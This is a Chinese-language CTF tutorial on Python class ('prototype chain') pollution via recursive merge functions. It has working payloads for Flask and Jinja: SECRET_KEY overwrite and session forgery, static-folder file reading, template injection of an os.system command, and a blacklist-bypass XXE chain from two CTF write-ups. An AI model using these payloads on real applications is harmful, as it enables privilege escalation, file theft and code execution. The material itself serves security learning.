---
title: Python 原型链污染
date: 2026-08-24 11:40:00
categories:
  - Web安全
tags:
  - Python
  - 原型链污染
disableNunjucks: true
description: Python 原型链污染
---


## 1. Python原型链污染

Python原型链污染是一种通过修改对象原型链中的属性，导致程序行为偏离预期的攻击技术。其核心原理与JavaScript原型链污染类似，但实现方式因语言特性而有所差异。

+ **原型继承特性**：Python中每个对象通过`__class__`属性指向其所属类，类通过`__base__`属性指向父类。当访问对象属性时，若当前对象/类中未定义，会沿原型链向上查找。
+ **污染条件**：需要存在递归合并函数（如`merge`）且未对特殊属性过滤

在 Python 中，每个对象都有一个原型链。当访问属性时，程序会先在对象本身查找，若找不到则沿着原型链向上查找。通过污染类的属性，可以影响所有实例的行为。

## 2. 污染条件与污染分析

原型链污染需要merge合并函数

例1：一个最简单的原型链污染：

```python
class Config:
    is_admin = False
    def set_config(cls, key, value):
        setattr(cls, key, value)
    def get_config(cls, key):
        return getattr(cls, key, None)
instance=Config()
print(instance.is_admin)     #False

setattr(instance,'is_admin','True')
print(instance.is_admin)     #True
```

刚初始化的instance里面的is_admin为false

经过setattr函数后is_admin变成了true，这个就是最简单的原型链污染

例2：利用merge的合并函数

```python
class father:
    secret = "hello"
class son_a(father):
    pass
class son_b(father):
    pass
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

# payload            
instance = son_b()
payload = {
    "__class__" : {
        "__base__" : {
            "secret" : "world"
        }
    }
}
print(son_a.secret)
#hello
print(instance.secret)
#hello
merge(payload, instance)
print(son_a.secret)
#world
print(instance.secret)
#world
```

代码分析：

+ `father.secret` 是一个**类属性**，被所有子类和实例共享
+ 当访问 `son_a.secret` 或 `instance.secret` 时，Python会沿着继承链查找

属性查找路径：

实例(instance) → 子类(son_b) → 父类(father) →目标属性（object）

当我们访问 `instance.secret` 时：

1. 先在 `instance` 本身查找
2. 如果没有，在 `instance.__class__` (即 `son_b`) 中查找
3. 如果没有，在 `son_b.__base__` (即 `father`) 中查找
4. 以此类推...

污染原理分析:

为什么需要污染类而不是实例？

```python
# 错误的方法 - 只影响单个实例
instance.secret = "world"  # 在实例上创建新属性
print(son_a.secret)        # 仍然是 "hello" - 未污染

# 正确的方法 - 影响所有相关类和实例
father.secret = "world"    # 修改类属性
print(son_a.secret)        # "world" - 成功污染
```

`污染路径分析`：

在我们的代码中，污染路径是：

son_b → __base__ → father → secret

通过修改 `son_b.__base__.secret`，我们实际上修改了：

+ `father.secret` 本身
+ 所有继承自 `father` 的类 (`son_a`, `son_b`)
+ 这些类的所有实例（包括已创建和将来创建的）

## 3. 关键利用点

### **全局变量污染**：

在函数或类方法中，我们经常会看到`__init__`初始化方法，但是它作为类的一个内置方法，在没有被重写作为函数的时候，其数据类型会被当做装饰器，而装饰器的特点就是都具有一个全局属性`__globals__`属性，`__globals__` 属性是函数对象的一个属性，用于访问该函数所在模块的全局命名空间。具体来说就是，`__globals__` 属性返回一个字典，里面包含了函数定义时所在模块的全局变量。

通过 _**globals**_ 属性，可以修改函数或类方法的全局变量。例如：

```python
a = 1
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
def demo():
    pass
class A:
    def __init__(self):
        pass
class B:
    classa = 2

# 通过merge加上globals来获得对应的全局变量
instance = A()
payload = {
    "__init__":{
        "__globals__":{
            "a":4,
            "B":{
                "classa":5
            }
        }
    }
}
print(B.a)
print(a)

merge(payload, instance)
print(B.a)
print(a)
```

### **模块污染**：

在全局变量的前提下，是我们都在入口文件中的类对象或者属性来进行操作的，但是如果我们操作的位置在入口文件中，而目标对象并不在入口文件当中，这时候我们就需要对其他加载过的模块来获取了。

#### 1.import加载获取：**直接导入**：`__init__.__globals__["module"]`

在简单的关系情况下，我们可以直接通过import来进行加载，在payload中我们只需要对对应的模块重新定位就可以：

```python
import demo
payload = {
    "__init__":{
        "__globals__":{
            "demo":{
                "a":4,
                "B":{
                    "classa":5
                }
            }
        }
    }
}
# demo.py
a = 1
class B:
    classa = 2
```

#### 2.sys模块加载获取：**init**.**globals**["sys"].modules

在很多环境当中，会引用第三方模块或者是内置模块，而不是简单的import同级文件下面的目录，所以我们就要借助sys模块中的module属性，这个属性能够加载出来在自运行开始所有已加载的模块，从而我们能够从属性中获取到我们想要污染的目标模块：

同样是刚才的情景，因为我们已经加载过demo.py了，所以我们用sys来对里面的目标进行获取,但是存在一个问题就是，我们的payload传参的时候大概率是在它源码已有的基础上进行传参，很有可能源码中没有引入。

```python
import sys
payload = {
    "__init__":{
        "__globals__":{
            "sys":{
                "modules":{
                    "demo":{
                        "a":4,
                        "B":{
                            "classa":5
                        }
                    }
                }
            }
        }
    }
}
```

#### 3.加载器loader获取：**loader**`或`**spec**

loader加载器在python中的作用是为实现模块加载而设计的类，其在`importlib`这一内置模块中有具体实现。而`importlib`模块下所有的`py`文件中均引入了`sys`模块，这样我们和上面的sys模块获取已加载模块就联系起来了，所以我们的目标就变成了只要获取了加载器loader，我们就可以通过`loader.__init__.__globals__['sys']`来获取到sys模块，然后再获取到我们想要的模块。那么我们现在的目标就变成了获取loader：

1.在Python中，`__loader__`是一个内置的属性，包含了加载模块的loader对象，Loader对象负责创建模块对象，通过`__loader__`属性，我们可以获取到加载特定模块的loader对象。

```python
import math
# 获取模块的loader
loader = math.__loader__
# 打印loader信息
print(loader)
```

在这个例子当中我们就能够明白，math模块的`__loader__`属性包含了一个loader对象，负责加载math模块

2.在python中还存在一个`__spec__`，包含了关于类加载时候的信息，他定义在`Lib/importlib/_bootstrap.py`的类`ModuleSpec`，所以可以直接采用`<模块名>.__spec__.__init__.__globals__['sys']`获取到`sys`模块。

### 函数形参默认值替换：

+ `__defaults__` 修改默认参数
+ `__kwdefaults__` 修改关键字参数

1.在Python中，`__defaults__`是一个元组，用于存储函数或方法的默认参数值。当我们去定义一个函数时，可以为其中的参数指定默认值。这些默认值会被存储在`__defaults__`元组中。

```python
def a(var_1, var_2 =2, var_3 = 3):
    pass
print(a.__defaults__)
#(2, 3)
```

所以我们就可以通过替换该属性，来实现对函数位置或者是键值默认值替换，但是前提条件是我们要替换的值是元组的形式：

```python
payload = {
    "__init__" : {
        "__globals__" : {
            "demo" : {
                "__defaults__" : (True,)
            }
        }
    }
}
```

2.`__kwdefaults__`是以字典形式来进行收录：

```python
payload = {
    "__init__" : {
        "__globals__" : {
            "demo" : {
                "__kwdefaults__" : {
                    "shell" : True
                }
            }
        }
    }
}
```

## 4. Flask + Jinja

通过原型链污染，我们可以直接修改Flask应用的配置和Jinja环境

### 4.1 Flask特定配置污染

#### flask密钥替换：`SECRET_KEY` 伪造session

**污染路径：** 通过原型链污染修改 `app.config["SECRET_KEY"]`

（例题）

如果我们可以对密钥进行替换，赋值为我们想要的，我们就可以进行任意的session伪造，这里因为`secret_key`是在当前入口文件下面的，所以我们可以直接通过`__init__.__globals__`获取全局变量，然后通过`app.config["SECRET_KEY"]`来进行污染：

```python
from flask import Flask,request
import json

app = Flask(__name__)

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class cls():
    def __init__(self):
        pass

instance = cls()

@app.route('/',methods=['POST', 'GET'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    return "[+]Config:%s"%(app.config['SECRET_KEY'])

app.run(host="0.0.0.0")
```

这里我们并无法确定secretkey是什么，所以如果能够污染我们就可以实现任意的session伪造

```python
{
    "__init__" : {
        "__globals__" : {
            "app" : {
                "config" : {
                    "SECRET_KEY" :"Polluted~"
                }
            }
        }
    }
}
```

#### `_got_first_request`重置触发初始化

**污染路径：** 通过原型链污染修改 `app._got_first_request`

用于判定是否某次请求为自 Flask 启动后第一次请求，是 `Flask.got_first_request` 函数的返回值，此外还会影响装饰器 `app.before_first_request` 的调用，依据源码可以知道`_got_first_request` 值为假时才会调用

示范环境如下：

```python
from flask import Flask,request
import json

app = Flask(__name__)

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class cls():
    def __init__(self):
        pass

instance = cls()

flag = "Is flag here?"

@app.before_first_request
def init():
    global flag
    if hasattr(app, "special") and app.special == "U_Polluted_It":
        flag = open("flag", "rt").read()

@app.route('/',methods=['POST', 'GET'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    global flag
    setattr(app, "special", "U_Polluted_It")
    return flag

app.run(host="0.0.0.0")
#flag

flag{U_Find_Me}
```

`before_first_request` 修饰的 `init` 函数只会在第一次访问前被调用，而其中读取 flag 的逻辑又需要访问路由 `/` 后才能触发，这就构成了矛盾。所以需要使用 payload 在访问 `/` 后重置`_got_first_request` 属性值为假，这样 `before_first_request` 才会再次调用。

所以，直接访问没有 flag携带 Payload 重置`_got_first_request` 属性值为假

```python
{
    "__init__":{
        "__globals__":{
            "app":{
                "_got_first_request":false
            }
        }
    }
}
```

`init` 函数被触发，且其中读取 flag 的相关逻辑被执行，这样就获得了 flag

#### `_static_url_path`目录穿越读取文件

**污染路径：** 通过原型链污染修改 `app._static_folder`

这个属性中存放的是 flask 中静态目录的值，默认该值为 `static`。访问 flask 下的资源可以采用如 `http://domain/static/xxx`，这样实际上就相当于访问`_static_url_path` 目录下 xxx 的文件并将该文件内容作为响应内容返回

```python
#static/index.html

<html>
<h1>hello</h1>
<body>    
</body>
</html>
#app.py

from flask import Flask,request
import json

app = Flask(__name__)

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class cls():
    def __init__(self):
        pass

instance = cls()

@app.route('/',methods=['POST', 'GET'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    return "flag in ./flag but heres only static/index.html"

app.run(host="0.0.0.0")
#flag

flag{U_Find_Me}
```

此时 `http://domain/static/xxx` 只能访问到文件系统当前目录下 `static` 目录中的 `xxx` 文件，并且不存在如目录穿越的漏洞 (`http://domain/static/../flag` 会报错)

使用如下 payload 污染该属性为当前目录。

```python
{
    "__init__":{
        "__globals__":{
            "app":{
                "_static_folder":"./"
            }
        }
    }
}
```

这样就能通过 `/static/flag` 访问到当前目录下的 flag 文件了

### 4.2 Jinja模板引擎污染

通过原型链污染，可以直接修改Flask应用的Jinja环境配置，从而影响模板渲染行为

#### Jinja 语法标识符替换

**污染路径：** 通过原型链污染修改 `app.jinja_env.variable_start_string` 和 `app.jinja_env.variable_end_string`

**Jinja 模板引擎默认使用三组语法标识符：**

+ `{{ }}` 用于变量表达式
+ `{% %}` 用于控制语句
+ `{# #}` 用于注释语句

根据 Flask 官方文档说明，这些语法标识符可以通过修改 Jinja 环境类的相关属性进行自定义配置。

**漏洞原理：**在 Flask 应用初始化过程中，可以通过 `Flask.jinja_env` 属性访问到 Jinja 环境配置。如果攻击者能够通过某种途径修改这些配置属性，就可以实现语法标识符的重定义。

**攻击场景分析：**考虑以下模板代码：

```
<h1>Look this -> [[flag]] <- try to make it become the real flag</h1>
```

在此场景中，`[[flag]]` 原本不会被解析为模板变量。但如果攻击者能够注入以下配置：

```python
{
    "__init__": {
        "__globals__": {
            "app": {
                "jinja_env": {
                    "variable_start_string": "[[",
                    "variable_end_string": "]]"
                }
            }
        }
    }
}
```

则原本的静态文本 `[[flag]]` 将被识别为模板变量并进行渲染。

**说明：**需要注意的是，Flask 会对编译后的模板进行缓存。这意味着即使成功修改了语法标识符配置，已缓存的模板仍会使用原有的语法规则进行渲染。必须在配置修改后首次访问模板才能触发预期的解析行为。

#### Jinja 语法全局数据注入

**污染路径：** 通过原型链污染修改 `app.jinja_env.globals`

**漏洞机制：**  
Jinja 环境中的 `globals` 字典存储了模板渲染时可访问的全局变量。如果攻击者能够向此字典注入恶意条目，就可以影响模板的渲染逻辑。

**实际案例：**  
假设存在以下模板代码：

```html
{{flag if permission else "No way!"}}
```

该模板的逻辑依赖于 `permission` 变量的真值判断。通过以下攻击载荷：

```python
{
    "__init__": {
        "__globals__": {
            "app": {
                "jinja_env": {
                    "globals": {
                        "permission": true
                    }
                }
            }
        }
    }
}
```

攻击者可以绕过权限检查，直接获取 flag 内容。

#### 模板编译时的变量污染

**污染路径：** 通过原型链污染修改 `jinja2.runtime.exported`

**技术原理分析：**  
在 Jinja 模板编译过程中，会经历抽象语法树生成阶段。在 `jinja2/compiler.py` 的 `CodeGenerator.visit_Template` 方法中，存在一段关键代码：

该方法会从 `jinja2.runtime` 模块导入 `exported` 和 `async_exported` 变量，并将它们组合用于生成最终的编译代码。这一机制为攻击者提供了代码注入的机会。

**攻击向量构造：**  
通过污染 `jinja2.runtime` 模块中的 `exported` 变量，攻击者可以在模板编译阶段注入任意 Python 代码：

```python
{
    "__init__": {
        "__globals__": {
            "jinja2": {
                "runtime": {
                    "exported": [
                        "*;__import__('os').system('cp ./flag ./static/flag');#"
                    ]
                }
            }
        }
    }
}
```

+ 此攻击在模板编译阶段触发，而非渲染阶段
+ 任意模板的首次访问均可触发攻击载荷
+ 由于模板缓存机制，攻击仅在模板首次编译时有效

## 5. 练习题

### ez_inject

相关考点：`flask原型链污染`

session解码后的数据: {'is_admin': 0, 'username': '2'}

所以需要伪造session成为管理员，这时候就需要我们污染`secret_key`

```python
import requests
import json

url = "https://URL/register"
payload = {
    "username": "123",
    "password": "123",
    "__init__": {"__globals__": {"app": {"config": {"SECRET_KEY": "baozongwi"}}}},
}
r = requests.post(url=url, json=payload)
print(r.text)
```

成功之后，登录，然后改session

```python
flask-unsign --sign --cookie "{'is_admin': 1, 'username': '123'}" --secret  'baozongwi'  
eyJpc19hZG1pbiI6MSwidXNlcm5hbWUiOiJ0ZXN0In0.Zx22cA.SJsCGBAno33UFkFLzNXJJdDjbS
```

换了session之后可查看secret内容

### 极客大挑战2024-py_game

bp抓包获取session

![](/img/ctf/python-prototype-pollution-001.png)

flask解码获得秘钥，利用秘钥进行session伪造

![](/img/ctf/python-prototype-pollution-002.png)  
 改cookie session![](/img/ctf/python-prototype-pollution-003.png)

注册，登录成功

![](/img/ctf/python-prototype-pollution-004.png)

![](/img/ctf/python-prototype-pollution-005.png)

访问/admin

![](/img/ctf/python-prototype-pollution-006.png)

下载app.pyc文件，python反编译在线工具https://tool.lu/pyc/

```python
#!/usr/bin/env python
# visit https://tool.lu/pyc/ for more information
# Version: Python 3.6

import json
from lxml import etree
from flask import Flask, request, render_template, flash, redirect, url_for, session, Response, send_file, jsonify
app = Flask(__name__)
app.secret_key = 'a123456'
app.config['xml_data'] = '<?xml version="1.0" encoding="UTF-8"?><GeekChallenge2024><EventName>Geek Challenge</EventName><Year>2024</Year><Description>This is a challenge event for geeks in the year 2024.</Description></GeekChallenge2024>'

class User:
    
    def __init__(self, username, password):
        self.username = username
        self.password = password

    
    def check(self, data):
        if self.username == data['username']:
            pass
        return self.password == data['password']


admin = User('admin', '123456j1rrynonono')
Users = [
    admin]

def update(src, dst):#存在原型链污染方法
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and isinstance(v, dict):
                update(v, dst.get(k))
            else:
                dst[k] = v
        if hasattr(dst, k) and isinstance(v, dict):
            update(v, getattr(dst, k))
            continue
        setattr(dst, k, v)
    


def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        for u in Users:
            if u.username == username:
                flash('用户名已存在', 'error')
                return redirect(url_for('register'))
        
        new_user = User(username, password)
        Users.append(new_user)
        flash('注册成功！请登录', 'success')
        return redirect(url_for('login'))
    return None('register.html')

register = app.route('/register', [
    'GET',
    'POST'], **('methods',))(register)

def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        for u in Users:
            if u.check({
                'username': username,
                'password': password }):
                session['username'] = username
                flash('登录成功', 'success')
                return redirect(url_for('dashboard'))
        
        flash('用户名或密码错误', 'error')
        return redirect(url_for('login'))
    return None('login.html')

login = app.route('/login', [
    'GET',
    'POST'], **('methods',))(login)

def play():
    if 'username' in session:
        with open('/app/templates/play.html', 'r', 'utf-8', **('encoding',)) as file:
            play_html = file.read()
        return play_html
    None('请先登录', 'error')
    return redirect(url_for('login'))

play = app.route('/play', [
    'GET',
    'POST'], **('methods',))(play)

def admin():
    if 'username' in session and session['username'] == 'admin':
        return render_template('admin.html', session['username'], **('username',))
    None('你没有权限访问', 'error')
    return redirect(url_for('login'))

admin = app.route('/admin', [
    'GET',
    'POST'], **('methods',))(admin)

def downloads321():
    return send_file('./source/app.pyc', True, **('as_attachment',))

downloads321 = app.route('/downloads321')(downloads321)

def index():
    return render_template('index.html')

index = app.route('/')(index)

def dashboard():
    if 'username' in session:
        is_admin = session['username'] == 'admin'
        if is_admin:
            user_tag = 'Admin User'
        else:
            user_tag = 'Normal User'
        return render_template('dashboard.html', session['username'], user_tag, is_admin, **('username', 'tag', 'is_admin'))
    None('请先登录', 'error')
    return redirect(url_for('login'))

dashboard = app.route('/dashboard')(dashboard)

def xml_parse():
    
    try:
        xml_bytes = app.config['xml_data'].encode('utf-8')
        parser = etree.XMLParser(True, True, **('load_dtd', 'resolve_entities'))
        tree = etree.fromstring(xml_bytes, parser, **('parser',))
        result_xml = etree.tostring(tree, True, 'utf-8', True, **('pretty_print', 'encoding', 'xml_declaration'))
        return Response(result_xml, 'application/xml', **('mimetype',))
        except etree.XMLSyntaxError:
            e = None
            
            try:
                return str(e)
                e = None
                del e
            return None



xml_parse = app.route('/xml_parse')(xml_parse)
black_list = [
    '__class__'.encode(),
    '__init__'.encode(),
    '__globals__'.encode()]

def check(data):
    print(data)
    for i in black_list:
        print(i)
        if i in data:
            print(i)
            return False
    
    return True


def update_route():
    if 'username' in session and session['username'] == 'admin':
        if request.data:
            
            try:
                if not check(request.data):
                    return ('NONONO, Bad Hacker', 403)
                data = None.loads(request.data.decode())
                print(data)
                if all((lambda .0: pass)(data.values())):
                    update(data, User)
                    return (jsonify({
                        'message': '更新成功' }), 200)
                return None
            except Exception:
                e = None
                
                try:
                    return (f'''Exception: {str(e)}''', 500)
                    e = None
                    del e
                return ('No data provided', 400)
                return redirect(url_for('login'))
                return None



update_route = app.route('/update', [
    'POST'], **('methods',))(update_route)
if __name__ == '__main__':
    app.run('0.0.0.0', 80, False, **('host', 'port', 'debug'))
```

分析代码，

在`xml_parse()`函数中：

```python
def xml_parse():
    try:
        xml_bytes = app.config['xml_data'].encode('utf-8')
        parser = etree.XMLParser(True, True, **('load_dtd', 'resolve_entities'))
        tree = etree.fromstring(xml_bytes, parser, **('parser',))
        # ...
```

+ `load_dtd=True` 允许加载DTD
+ `resolve_entities=True` 允许解析外部实体
+ 这构成了典型的XXE漏洞条件

在`update_route()`函数中：

```python
def update_route():
    if 'username' in session and session['username'] == 'admin':
        if request.data:
            # ...
            data = None.loads(request.data.decode())
            if all((lambda .0: pass)(data.values())):
                update(data, User)  # 这里存在原型链污染
```

+ 管理员可以调用`/update`端点
+ `update(data, User)`函数存在原型链污染漏洞
+ 可以通过污染来修改`app.config`

所以，思路：

1. **利用原型链污染修改配置**：向`/update`端点发送POST请求，通过原型链污染修改`app.config['xml_data']`，注入恶意XML实体。
2. **触发XXE读取flag**：访问`/xml_parse`端点，解析恶意XML并获取flag。

```bash
# Content-Type: application/json
# POST /upload
# payload：
 
{
    "__init\u005f_" : {
        "__globals\u005f_" : {
            "app" : {
                "config" : {
                    "xml_data" :"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY example SYSTEM '/flag'> ]><flag>&example;</flag>"
                }
            }
        }
    }
}
```

更新成功

![](/img/ctf/python-prototype-pollution-007.png)

访问/xml_parse，flag~

![](/img/ctf/python-prototype-pollution-008.png)

SYC{8039781a-69e2-4dd4-bb98-ad5514e12f4a}
